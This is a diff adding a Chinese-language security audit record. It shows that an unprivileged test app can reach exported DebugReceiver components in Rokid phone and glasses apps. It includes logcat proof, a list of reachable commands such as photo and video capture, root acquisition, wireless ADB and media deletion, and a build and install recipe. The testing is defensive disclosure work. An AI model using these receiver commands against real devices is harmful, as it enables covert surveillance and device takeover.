@@ -1,0 +1,92 @@
+# 戒指稽核 — 「第三方 App 可否投遞 DebugReceiver」端到端實證
+**日期**：2026-09-13 15:45 · **目的**：把 `reports/ring_capture_security_audit_2026-09-13.md` §2 R4
+的「任何已安裝 App 都能送」由 manifest 推論提升為**端到端實測**。
+
+**受測裝置**
+| 角色 | 序號 | 型號 |
+|------|------|------|
+| 手機（App：`com.rokid.rc.phone`） | `<PHONE_SERIAL>` | 21091116UG（Xiaomi） |
+| 眼鏡（App：`com.rokid.rc.glasses`） | `<DEVICE_SERIAL>` | RG-glasses（RV101） |
+
+**測試 App**：`com.ringaudit.reachtest`（`build-cache/ringtest/`，8.6 KB，自簽）
+- 只有一個 Activity，`onCreate` 送兩個**唯讀**廣播：
+  - 手機端 `com.rokid.rc.phone/.DebugReceiver` + `cmd=TEST_RING_TEXT`（純字串對照，無副作用）
+  - 眼鏡端 `com.rokid.rc.glasses/.DebugReceiver` + `cmd=RING_STATUS`（只印狀態，無副作用）
+- **未**送任何有副作用指令（`CAPTURE_PHOTO`／`START_VIDEO`／`ACQUIRE_ROOT`／`PAIR_RING`／`WIFI_ADB`／`SET_*`／`DELETE_MEDIA`）。
+- 建置：`aapt2 link` → `javac` → `d8` → `jar uf` → `zipalign` → `apksigner`（Linux SDK 34.0.0 + 工作區 `jdk`）。
+
+**結果：兩台都成功**——廣播由**一般 App uid**（非 shell 的 2000）送出並被執行。
+
+---
+
+## 1. 手機（sender uid **10346**）
+
+```
+09-13 15:45:40.270 19776 19776 I RingReachTest: SENDER uid=10346 pkg=com.ringaudit.reachtest (shell=2000; app uid 應為 10xxx)
+09-13 15:45:40.271 19776 19776 I RingReachTest: SENDER sent -> com.rokid.rc.phone/com.rokid.rc.phone.DebugReceiver cmd=TEST_RING_TEXT
+09-13 15:45:40.277 19776 19776 I RingReachTest: SENDER sent -> com.rokid.rc.glasses/com.rokid.rc.glasses.DebugReceiver cmd=RING_STATUS
+
+--- 接收端（com.rokid.rc.phone 行程 19836）---
+09-13 15:45:41.297 19836 19836 I DebugReceiver: onReceive cmd=TEST_RING_TEXT connected=false
+09-13 15:45:41.322 19836 19916 I DebugReceiver: executing TEST_RING_TEXT connected=false
+09-13 15:45:41.335 19836 19916 I DebugReceiver: TEST_RING_TEXT photo_ok -> 已拍照 IMG_1.jpg
+09-13 15:45:41.339 19836 19916 I DebugReceiver: TEST_RING_TEXT photo_fail -> 拍照失敗：IMG_1.jpg
+09-13 15:45:41.340 19836 19916 I DebugReceiver: TEST_RING_TEXT video_start -> 開始錄影
+（其餘 12 行同，略）
+```
+
+- `uid=10346` ＝ 一般第三方 App（`shell` 為 2000、`system` 為 1000）。
+- 手機端行程**確實執行**了指令（`executing TEST_RING_TEXT` 之後是 15 行對照輸出）。
+- `connected=false` 只表示當時手機沒連著眼鏡；**可達性**與連線狀態無關。
+
+## 2. 眼鏡（sender uid **10064**）
+
+```
+09-13 15:45:55.082  5100  5100 I RingReachTest: SENDER uid=10064 pkg=com.ringaudit.reachtest (shell=2000; app uid 應為 10xxx)
+09-13 15:45:55.085  5100  5100 I RingReachTest: SENDER sent -> com.rokid.rc.glasses/com.rokid.rc.glasses.DebugReceiver cmd=RING_STATUS
+
+--- 接收端 ---
+09-13 15:45:55.116 26943 26943 I GlassesDebugReceiver: RING_STATUS enabled=true running=true device=/dev/input/event1 last=running//dev/input/event1
+```
+
+眼鏡端回報的是**即時戒指控制狀態**（`enabled=true running=true device=/dev/input/event1`），
+與 §2 R2 的獨立量測（眼鏡 prefs／`getevent`）一致。
+
+## 3. 結論
+
+| 先前標記 | 現在 |
+|----------|------|
+| 「任何第三方 App 可投遞」＝**平台語意推論（High）** | ✅ **FACT（Very High）**：以 uid 10346／10064 實測投遞並執行 |
+| FACTS §9-D「第三方 App 端到端投遞實證」 | ✅ **已結案**（本檔） |
+
+**影響**：任何已安裝的 App（不需要任何權限）可以——
+- 手機：`CAPTURE_PHOTO`／`START_VIDEO`／`STOP_VIDEO`、`ACQUIRE_ROOT`、`WIFI_ADB`、
+  `WIFI_CONNECT --es host <任意 IP>`、**`PAIR_RING`／`WATCH_RING`（自動配對）**、
+  `DELETE_MEDIA`、`SET_RING` …
+- 眼鏡：**`RING_START`（可改綁裝置／pattern）**、`RING_STOP`、`PAIR_RING`、`SET_DISPLAY`…
+
+## 4. 清理
+
+測試 App 已自兩台裝置移除（`adb uninstall com.ringaudit.reachtest` → `Success`，
+`pm list packages | grep ringaudit` 無輸出）。APK 與建置素材保留在
+`build-cache/ringtest/`（`out/app-signed.apk`），可隨時重裝複驗。
+
+## 5. 重現
+
+```bash
+cd /home/kali/rokid_root/build-cache/ringtest
+export JAVA_HOME=/home/kali/jdk; export PATH="$JAVA_HOME/bin:$PATH"
+BT=/home/kali/android-sdk/build-tools/34.0.0
+AJ=/home/kali/android-sdk/platforms/android-34/android.jar
+mkdir -p out/classes out/dex
+javac -source 8 -target 8 -bootclasspath "$AJ" -d out/classes $(find src -name '*.java')
+"$BT/d8" --release --lib "$AJ" --min-api 24 --output out/dex out/classes/com/ringaudit/reachtest/*.class
+"$BT/aapt2" link -o out/base.apk --manifest AndroidManifest.xml -I "$AJ" --min-sdk-version 24 --target-sdk-version 33
+cp out/base.apk out/app-unsigned.apk && ( cd out && cp dex/classes.dex . && "$JAVA_HOME/bin/jar" uf app-unsigned.apk classes.dex )
+"$BT/zipalign" -f -p 4 out/app-unsigned.apk out/app-aligned.apk
+"$BT/apksigner" sign --ks out/ringtest.keystore --ks-pass pass:android --key-pass pass:android \
+    --out out/app-signed.apk out/app-aligned.apk
+ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
+"$ADB" -s <PHONE_SERIAL> install -r out/app-signed.apk
+"$ADB" -s <PHONE_SERIAL> shell 'logcat -c; am start -n com.ringaudit.reachtest/.MainActivity; sleep 4; logcat -d -s RingReachTest:* -s DebugReceiver:*'
+```
